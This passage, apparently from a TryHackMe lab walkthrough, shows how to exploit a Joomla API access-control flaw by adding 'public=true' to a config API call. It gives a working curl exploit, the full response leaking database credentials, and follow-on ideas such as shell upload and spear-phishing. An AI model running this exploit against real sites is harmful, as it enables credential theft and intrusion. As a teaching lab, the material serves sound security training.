https://docs.joomla.org/J4.x:Joomla_Core_APIs

Exploiting the vulnerability is simple for a red teamer and only requires setting the value of the public variable from false to true while making the API call. The list of API calls related to users, content, banners, application configuration, etc., can be found at this [link](https://docs.joomla.org/J4.x:Joomla_Core_APIs).

Standard API Call

A general description of normal and malicious API calls is shown below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/27d74bfb544be68b54e8e85329a6086b.png)  

We can see that an attacker can exploit the application by sending an API request. If we want to get configuration details, we can make the following web call:

  

\api\includes\app.php

```shell-session
thm@ubuntu$ curl -v http://10.10.243.165/api/index.php/v1/config/application?public=true                                                           {"links":{"self":"http:\/\/10.10.243.165\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/10.10.243.165\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/10.10.243.165\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"220","attributes":{"offline":false,"id":220}},{"type":"application","id":"220","attributes":{"offline_message":"This site is down for maintenance.Please check back again soon.","id":220}},{"type":"application","id":"220","attributes":{"display_offline_message":1,"id":220}},{"type":"application","id":"220","attributes":{"offline_image":"","id":220}},{"type":"application","id":"220","attributes":{"sitename":"Joomify Website","id":220}},{"type":"application","id":"220","attributes":{"editor":"tinymce","id":220}},{"type":"application","id":"220","attributes":{"captcha":"0","id":220}},{"type":"application","id":"220","attributes":{"list_limit":20,"id":220}},{"type":"application","id":"220","attributes":{"access":1,"id":220}},{"type":"application","id":"220","attributes":{"debug":false,"id":220}},{"type":"application","id":"220","attributes":{"debug_lang":false,"id":220}},{"type":"application","id":"220","attributes":{"debug_lang_const":true,"id":220}},{"type":"application","id":"220","attributes":{"dbtype":"mysqli","id":220}},{"type":"application","id":"220","attributes":{"host":"localhost","id":220}},{"type":"application","id":"220","attributes":{"user":"root","id":220}},{"type":"application","id":"220","attributes":{"password":"tesla@musk","id":220}},{"type":"application","id":"220","attributes":{"db":"joomla_db","id":220}},{"type":"application","id":"220","attributes":{"dbprefix":"uh020_","id":220}},{"type":"application","id":"220","attributes":{"dbencryption":0,"id":220}},{"type":"application","id":"220","attributes":{"dbsslverifyservercert":false,"id":220}}],"meta":{"total-pages":4}}* Connection #0 to host 10.10.243.165 left intact  
```

Possible Impact

Since the API allows information leakage, including sensitive database credentials, a few of the possible avenues for exploitation are mentioned below:

- Password re-use vulnerability to log in to the **admin panel** of the Joomla application or the server through **SSH/VNC**.
- Connecting to the database and uploading the shell leads to `remote code execution`.
- Extracting private information of the website users and launching spear-phishing campaigns